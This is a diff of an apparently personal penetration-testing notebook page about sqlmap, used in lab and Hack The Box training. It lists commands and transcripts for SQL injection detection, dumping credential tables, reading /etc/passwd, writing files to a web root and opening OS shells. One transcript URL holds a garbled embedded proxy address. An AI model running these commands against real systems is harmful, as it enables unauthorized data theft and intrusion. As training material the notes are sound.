@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/sqlmap.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Test one parameter in a captured request
+[Search this tool’s saved examples](/commands/notebook?tool=sqlmap) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Test one parameter in a captured request
 
 **Run in:** Kali. **Requires:** A saved HTTP request that works unchanged, a selected parameter and valid session/CSRF handling.
 
@@ -21,87 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 sqlmap -r request.txt -p PARAMETER --batch
 ```
 
-**Read the result:** Preserve a valid authenticated request and select the input before interpreting confirmed technique and DBMS evidence.
-
-**If The replay is redirected to login or responses vary unpredictably:** An expired session or CSRF failure cannot be repaired by increasing level/risk; database access and OS execution remain separate outcomes.
+**What the result establishes:** Preserve a valid authenticated request and select the input before interpreting confirmed technique and DBMS evidence.
 
 **Next check:** Repair the request baseline before interpreting injection results; confirm reported technique and DBMS before selecting enumeration options.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## sqlmap: choose the operation and read the result
-
-Test an identified SQL injection surface using a saved request.
-
-### What the result establishes
-
-Preserve a valid authenticated request and select the input before interpreting confirmed technique and DBMS evidence.
-
-### Prerequisites and common failures
-
-An expired session or CSRF failure cannot be repaired by increasing level/risk; database access and OS execution remain separate outcomes.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-sqlmap -r request.txt --batch
-sqlmap -r request.txt --dbs
-sqlmap -r request.txt -D DATABASE --tables
-```
-
-### Example 2: Earlier notebook reference
-
-Run in: **Saved lab example**.
-
-```bash
-sqlmap -r request.txt --batch                 # from a saved raw request
-sqlmap -u "http://$IP/item?id=1" --batch --dbs
-sqlmap -u "http://$IP/item?id=1" -D shop --tables
-sqlmap -u "http://$IP/item?id=1" -D shop -T users --dump
-# Auth / cookies / POST
-sqlmap -u "http://$IP/login" --data "user=a&pass=b" -p user
-sqlmap -u "http://$IP/x" --cookie "PHPSESSID=..." --level 5 --risk 3
-# Shells
-sqlmap -r request.txt --os-shell            # OS command shell if possible
-sqlmap -r request.txt --sql-shell
-```
-
-Saved context: [SQLMap — Earlier notebook reference](/web/sqlmap#earlier-notebook-reference). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Finding things
-
-Run in: **Saved lab example**.
-
-```bash
-find / -name "*.conf" 2>/dev/null      # find by name, hide permission errors
-find . -type f -mmin -10               # files modified in last 10 min
-locate sqlmap                          # fast name search (run: sudo updatedb first)
-which nmap                             # path of a command
-whereis nmap
-grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
-```
-
-Saved context: [Kali Terminal, tmux, zsh, and Vim — Finding things](/cheatsheets/terminal-tmux-zsh-cheatsheet#finding-things). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Test an identified SQL injection surface using a saved request.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=sqlmap) · [All tools](/index)
 
 ## Commands
 
@@ -113,11 +43,15 @@ sqlmap -r request.txt --dbs
 sqlmap -r request.txt -D DATABASE --tables
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The replay is redirected to login or responses vary unpredictably | An expired session or CSRF failure cannot be repaired by increasing level/risk; database access and OS execution remain separate outcomes. |
 
 ## Notebook recipes
 
-2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+61 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -145,11 +79,291 @@ grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in f
 
 </Accordion>
 
-<Accordion title="sqlmap: Saved Requests and Enumeration">
+<Accordion title="Detection technique">
 
-### sqlmap: Saved Requests and Enumeration
+### Detection technique
 
-**sqlmap: Saved Requests and Enumeration**
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --technique=BEU
+sqlmap -r request.txt -p id --technique=U --union-cols=4
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Detection technique](/web/sqlmap#detection-technique)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Establish the database context">
+
+### Establish the database context
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --banner --current-user --current-db --is-dba
+sqlmap -r request.txt -p id --dbs
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Establish the database context](/web/sqlmap#establish-the-database-context)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="File and operating-system operations">
+
+### File and operating-system operations
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --file-read='/etc/passwd'
+printf '%s\n' 'sqlmap-write-proof' > sqlmap-proof.txt
+sqlmap -r request.txt -p id --file-write='sqlmap-proof.txt' \
+  --file-dest='/var/www/html/sqlmap-proof.txt'
+curl -sS 'http://app.htb/sqlmap-proof.txt'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — File and operating-system operations](/web/sqlmap#file-and-operating-system-operations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --sql-shell
+sqlmap -r request.txt -p id --os-shell
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — File and operating-system operations](/web/sqlmap#file-and-operating-system-operations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="GET, POST, and authenticated requests">
+
+### GET, POST, and authenticated requests
+
+**SQLMap**
+
+```bash
+sqlmap -u 'http://app.htb/item.php?id=1' -p id
+sqlmap -u 'http://app.htb/search.php' --data='id=1&category=all' -p id
+sqlmap -u 'http://app.htb/item.php?id=1' -p id \
+  --cookie='PHPSESSID=REPLACE_WITH_LAB_SESSION'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — GET, POST, and authenticated requests](/web/sqlmap#get-post-and-authenticated-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="JSON and a specific injection position">
+
+### JSON and a specific injection position
+
+**SQLMap**
+
+```bash
+sqlmap -u 'http://app.htb/api/search' \
+  --headers='Content-Type: application/json' \
+  --data='{"id":"1*","category":"all"}'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — JSON and a specific injection position](/web/sqlmap#json-and-a-specific-injection-position)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Level, risk, and timing">
+
+### Level, risk, and timing
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --level=2 --risk=1
+sqlmap -r request.txt -p id --technique=T --time-sec=3 --threads=1
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Level, risk, and timing](/web/sqlmap#level-risk-and-timing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Locate relevant tables or columns">
+
+### Locate relevant tables or columns
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id -D dev --schema
+sqlmap -r request.txt -p id --search -T user
+sqlmap -r request.txt -p id --search -C pass
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Locate relevant tables or columns](/web/sqlmap#locate-relevant-tables-or-columns)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Payload transformations">
+
+### Payload transformations
+
+**SQLMap**
+
+```bash
+sqlmap --list-tampers
+sqlmap -r request.txt -p id --tamper=space2comment -v 3
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Payload transformations](/web/sqlmap#payload-transformations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Prefix, suffix, and response comparison">
+
+### Prefix, suffix, and response comparison
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --prefix="')" --suffix='-- -'
+sqlmap -r request.txt -p id --string='Welcome back'
+sqlmap -r request.txt -p id --not-string='No results'
+sqlmap -r request.txt -p id --text-only
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Prefix, suffix, and response comparison](/web/sqlmap#prefix-suffix-and-response-comparison)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Random or calculated request values">
+
+### Random or calculated request values
+
+**SQLMap**
+
+```bash
+sqlmap -u 'http://app.htb/item.php?id=1&nonce=12345' -p id --randomize=nonce
+sqlmap -u 'http://app.htb/item.php?id=1&h=REPLACE' -p id \
+  --eval='import hashlib; h=hashlib.md5(str(id).encode()).hexdigest()'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Random or calculated request values](/web/sqlmap#random-or-calculated-request-values)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Read the detection output">
+
+### Read the detection output
+
+**SQLMap**
+
+```bash
+# Show payloads and record request/response traffic.
+sqlmap -r request.txt -p id -v 3 -t sqlmap-traffic.txt
+
+# Review through an already-running local Burp proxy.
+sqlmap -r request.txt -p id --proxy='http://127.0.0.1:8080'
+
+# Include database errors when the application exposes them.
+sqlmap -r request.txt -p id --parse-errors
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Read the detection output](/web/sqlmap#read-the-detection-output)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --output-dir='./evidence/sqlmap'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Read the detection output](/web/sqlmap#read-the-detection-output)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Recover from stale or misleading state">
+
+### Recover from stale or misleading state
+
+**SQLMap**
+
+```bash
+# Ignore cached query results while retaining identified injection information.
+sqlmap -r request.txt -p id --fresh-queries --current-db
+
+# Re-test after a meaningful target/request change; this clears target session data.
+sqlmap -r request.txt -p id --flush-session
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Recover from stale or misleading state](/web/sqlmap#recover-from-stale-or-misleading-state)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap**
 
 ```bash
 sqlmap -r request.txt --batch                 # from a saved raw request
@@ -166,7 +380,1460 @@ sqlmap -r request.txt --sql-shell
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [SQLMap — Earlier notebook reference](/web/sqlmap#earlier-notebook-reference)
+**Original note sections:** [SQLMap — Recover from stale or misleading state](/web/sqlmap#recover-from-stale-or-misleading-state)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Refresh a CSRF token">
+
+### Refresh a CSRF token
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --csrf-token='csrf-token' \
+  --csrf-url='http://app.htb/form.php'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Refresh a CSRF token](/web/sqlmap#refresh-a-csrf-token)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Start with a request that works">
+
+### Start with a request that works
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Start with a request that works](/web/sqlmap#start-with-a-request-that-works)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Targeted database enumeration">
+
+### Targeted database enumeration
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id -D dev --tables
+sqlmap -r request.txt -p id -D dev -T credentials --columns
+sqlmap -r request.txt -p id -D dev -T credentials -C username,password --dump
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Targeted database enumeration](/web/sqlmap#targeted-database-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id -D dev -T credentials -C username,password \
+  --dump --start=1 --stop=3
+sqlmap -r request.txt -p id -D dev -T credentials --dump \
+  --where="username='lab-user'"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Targeted database enumeration](/web/sqlmap#targeted-database-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Anti-CSRF Token Bypass">
+
+### Anti-CSRF Token Bypass
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 22:18:01 /2020-09-18/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Anti-CSRF Token Bypass](/web/htb/sqlmap-essentials#anti-csrf-token-bypass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Basic DB Data Enumeration">
+
+### Basic DB Data Enumeration
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 13:30:57 /2020-09-17/
+
+[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
+[13:30:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5134=5134
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
+---
+[13:30:57] [INFO] the back-end DBMS is MySQL
+[13:30:57] [INFO] fetching banner
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0
+banner: '5.1.41-3~bpo50+1'
+[13:30:58] [INFO] fetching current user
+current user: 'root@%'
+[13:30:58] [INFO] fetching current database
+current database: 'testdb'
+[13:30:58] [INFO] testing if current user is DBA
+[13:30:58] [INFO] fetching current user
+current user is DBA: True
+[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'
+
+[*] ending @ 13:30:58 /2020-09-17/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Basic DB Data Enumeration](/web/htb/sqlmap-essentials#basic-db-data-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Basic Scenario">
+
+### Basic Scenario
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 22:26:45 /2020-09-09/
+
+[22:26:45] [INFO] testing connection to the target URL
+[22:26:45] [INFO] testing if the target URL content is stable
+[22:26:46] [INFO] target URL content is stable
+[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
+[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
+[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:26:46] [WARNING] reflective value(s) found and filtering out
+[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
+[22:26:46] [INFO] testing 'Generic inline queries'
+[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+...SNIP...
+[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[22:26:46] [INFO] testing 'MySQL inline queries'
+[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       
+...SNIP...
+[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[22:26:56] [INFO] target URL appears to have 3 columns in query
+[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8814=8814
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
+---
+[22:26:56] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0
+[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'
+
+[*] ending @ 22:26:57 /2020-09-09/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Basic Scenario](/web/htb/sqlmap-essentials#basic-scenario)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Calculated Parameter Bypass">
+
+### Calculated Parameter Bypass
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
+URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
+URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
+URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Calculated Parameter Bypass](/web/htb/sqlmap-essentials#calculated-parameter-bypass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Checking for DBA Privileges">
+
+### Checking for DBA Privileges
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 17:31:55 /2020-11-19/
+
+[17:31:55] [INFO] resuming back-end DBMS 'mysql'
+[17:31:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: False
+
+[*] ending @ 17:31:56 /2020-11-19
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Checking for DBA Privileges](/web/htb/sqlmap-essentials#checking-for-dba-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:37:47 /2020-11-19/
+
+[17:37:47] [INFO] resuming back-end DBMS 'mysql'
+[17:37:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: True
+
+[*] ending @ 17:37:48 /2020-11-19/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Checking for DBA Privileges](/web/htb/sqlmap-essentials#checking-for-dba-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Conditional Enumeration">
+
+### Conditional Enumeration
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+
+...SNIP...
+Database: testdb
+
+Table: users
+[1 entry]
++----+--------+---------+
+| id | name   | surname |
++----+--------+---------+
+| 2  | fluffy | bunny   |
++----+--------+---------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Conditional Enumeration](/web/htb/sqlmap-essentials#conditional-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Curl Commands">
+
+### Curl Commands
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Curl Commands](/web/htb/sqlmap-essentials#curl-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Custom HTTP Requests">
+
+### Custom HTTP Requests
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -r req.txt
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.4.9}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 00:03:44 /2020-09-15/
+
+[00:03:44] [INFO] parsing HTTP request from 'req.txt'
+JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
+[00:03:45] [INFO] testing connection to the target URL
+[00:03:45] [INFO] testing if the target URL content is stable
+[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
+[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
+[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Custom HTTP Requests](/web/htb/sqlmap-essentials#custom-http-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Custom SQLMap Requests">
+
+### Custom SQLMap Requests
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Custom SQLMap Requests](/web/htb/sqlmap-essentials#custom-sqlmap-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Custom SQLMap Requests](/web/htb/sqlmap-essentials#custom-sqlmap-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Custom SQLMap Requests](/web/htb/sqlmap-essentials#custom-sqlmap-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="DB Schema Enumeration">
+
+### DB Schema Enumeration
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
+
+...SNIP...
+Database: master
+Table: log
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| date   | datetime     |
+| agent  | varchar(512) |
+| id     | int(11)      |
++--------+--------------+
+
+Database: owasp10
+Table: accounts
+[4 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| cid         | int(11) |
+| mysignature | text    |
+| password    | text    |
+| username    | text    |
++-------------+---------+
+...
+Database: testdb
+Table: data
+[2 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| content | blob    |
+| id      | int(11) |
++---------+---------+
+
+Database: testdb
+Table: users
+[3 columns]
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| id      | int(11)       |
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
